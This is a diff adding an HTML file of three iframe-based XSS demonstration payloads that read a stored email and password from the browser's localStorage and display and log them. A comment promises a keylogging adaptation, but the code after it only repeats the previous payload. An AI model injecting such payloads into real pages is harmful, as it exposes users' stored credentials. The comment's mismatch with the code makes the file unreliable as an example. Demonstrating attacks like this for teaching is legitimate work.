@@ -1,0 +1,52 @@
+
+<iframe srcdoc="
+    <h1>This is XSS injection Attack</h1>
+    <p>This is inside the iframe.</p>
+    <script>
+        let email = localStorage.getItem('email');
+        console.log('User email:', email);
+    </script>
+    <p> This is the users email: <span id='user-email'></span></p>
+    <script>
+        document.getElementById('user-email').textContent = email;
+    </script>
+"></iframe>
+
+
+<iframe srcdoc="
+    <h1>This is XSS injection Attack</h1>
+    <p>This is inside the iframe.</p>
+    <script>
+        let email = localStorage.getItem('email');
+        let password = localStorage.getItem('password');
+        console.log('User email:', email);
+        console.log('User password:', password);
+    </script>
+    <p> This is the users email and password: <span id='user-email'></span> <span id='user-password'></span></p>
+    <script>
+        document.getElementById('user-email').textContent = email;
+    </script>
+    <script>
+        document.getElementById('user-password').textContent = password;
+    </script>
+"></iframe>
+
+<!-- Educational purpose only: To keylog the password you can adapt the script as following: -->
+
+<iframe srcdoc="
+    <h1>This is XSS injection Attack</h1>
+    <p>This is inside the iframe.</p>
+    <script>
+        let email = localStorage.getItem('email');
+        let password = localStorage.getItem('password');
+        console.log('User email:', email);
+        console.log('User password:', password);
+    </script>
+    <p> This is the users email and password: <span id='user-email'></span> <span id='user-password'></span></p>
+    <script>
+        document.getElementById('user-email').textContent = email;
+    </script>
+    <script>
+        document.getElementById('user-password').textContent = password;
+    </script>
+"></iframe>
